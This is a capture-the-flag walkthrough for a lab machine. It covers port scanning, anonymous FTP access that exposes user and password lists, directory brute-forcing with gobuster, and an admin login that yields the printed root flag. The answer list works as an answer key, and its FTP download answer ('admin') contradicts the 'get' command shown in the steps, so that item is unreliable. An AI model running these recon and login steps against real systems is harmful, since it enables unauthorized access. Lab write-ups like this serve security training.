# Tasks
- What Nmap scanning switch employs the use of default scripts during a scan?
	- -sC
- What service version is found to be running on port 21?
	-  vsftpd 3.0.3
- What FTP code is returned to us for the "Anonymous FTP login allowed" message?
	- 230
- After connecting to the FTP server using the ftp client, what username do we provide when prompted to log in anonymously?
	- anonymous
- After connecting to the FTP server anonymously, what command can we use to download the files we find on the FTP server?
	- admin
- What is one of the higher-privilege sounding usernames in 'allowed.userlist' that we download from the FTP server?
	- admin
- What version of Apache HTTP Server is running on the target host?
	- Apache httpd 2.4.41
- What switch can we use with Gobuster to specify we are looking for specific filetypes?
	- -x
- Which PHP file can we identify with directory brute force that will provide the opportunity to authenticate to the web service?
	- login.php
- Submit root flag
	- c7110277ac44d78b6a9fff2232434d16


# Steps
- First, let's do a rustscan to see what we are dealing with.
```
rustscan --ulimit 5000 --addresses "10.129.1.15" --top -- -sC -sV
```
- From the results, we are able to see that FTP is running on this box.
```
PORT   STATE SERVICE REASON         VERSION  
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3  
| ftp-anon: Anonymous FTP login allowed (FTP code 230)  
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist  
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd  
| ftp-syst:    
|   STAT:    
| FTP server status:  
|      Connected to ::ffff:10.10.14.21  
|      Logged in as ftp  
|      TYPE: ASCII  
|      No session bandwidth limit  
|      Session timeout in seconds is 300  
|      Control connection is plain text  
|      Data connections will be plain text  
|      At session startup, client count was 4  
|      vsFTPd 3.0.3 - secure, fast, stable  
|_End of status  
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))  
|_http-title: Smash - Bootstrap Business Template  
|_http-server-header: Apache/2.4.41 (Ubuntu)  
| http-methods:    
|_  Supported Methods: HEAD GET POST OPTIONS  
|_http-favicon: Unknown favicon MD5: 1248E68909EAE600881B8DB1AD07F356  
Service Info: OS: Unix
```
- We can see that anonymous login is supported, so let's take advantage of that.
```
ftp ftp://anonymous@10.129.1.15
```
- We can see a dump of allowed users and their passwords on this box.
```
ftp> ls  
229 Entering Extended Passive Mode (|||47895|)  
150 Here comes the directory listing.  
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist  
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd  
226 Directory send OK.  
ftp>
```
- Let's download these files onto our machine
```
get allowed.userlist
get allowed.userlist.passwd
```
- Here's the dump of both files.
- allowed.userlist:
```
varon  
pwnmeow  
egotisticalsw  
admin
```
- allowed.userlist.passwd
```
root  
Supersecretpassword1  
@BaASD&9032123sADS  
rKXM59ESxesUFHAd
```
- The FTP server is only anonymous login, so we need to keep looking elsewhere.
- We DO know that a web server is also being ran on this box, so let's look at that.
- We see that it's a website for a buisness. No other info is given to us. Therefore, we can do a dir search using gobuster.
```
gobuster dir --url http://10.129.1.15 --wordlist `fzf-wordlists`
```
- From the results, we can see the existance of a login portal via logout.php and login.php.
- We can then use the admin/rKXM59ESxesUFHAd credentials to log into the portal
- We can then get into the admin portal and get the flag!
```
Here is your flag: c7110277ac44d78b6a9fff2232434d16
```
